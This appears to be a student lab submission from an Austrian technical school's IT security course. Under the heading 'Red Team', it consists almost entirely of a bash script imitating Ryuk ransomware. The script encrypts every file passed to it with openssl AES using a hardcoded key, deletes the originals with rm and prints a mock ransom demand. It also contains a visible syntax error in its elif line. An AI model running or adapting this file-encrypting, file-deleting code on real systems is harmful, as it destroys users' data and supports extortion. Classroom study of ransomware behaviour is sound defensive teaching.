# Ryuk-Ransomware

| Kategorie | Wert |
| ---- | ---- |
| Klasse | 5AHITS |
| Verfasser | Xu Matthias Chen, Jonas Franz Wolfbauer |
| Datum | 29.09.2026 |
| Fach | ITSE (Übungen) |
| Link | https://www.franzmatejka.at/htl/doc/ITSI/lab/ransom_ryuk/01_ryuk.html |

## Übung 1.2 (Ryuk - Red Team)

```bash
#!/bin/bash

        for arg in "$@";
        do
                echo "Argument: $arg"

                if [ "$arg" == "$0" ];
                then
                        continue
                elif[ -d "$arg" ];
                then
                        continue
                else                                                                                                                                                                                                                                                                                                                                       
                        openssl aes-256-cbc -in "$arg" -K '0106eb4887051520fcf40b5e8fa5acceab272785c1055ce53e3c201b1d3441fe' -iv '0' -out "${arg}.enc"
                        rm "$arg"
                fi
        done
        
        echo "Horst was here."
        echo "!!! === YOUR FILES ARE ENCRYPTED === !!!"
        echo "Pay a ransom of 5 Yuan to get your files back - wallet address: horst@lichter.de"
 
        echo ""
        echo "At this point, this file should but won't delete itself right now."
```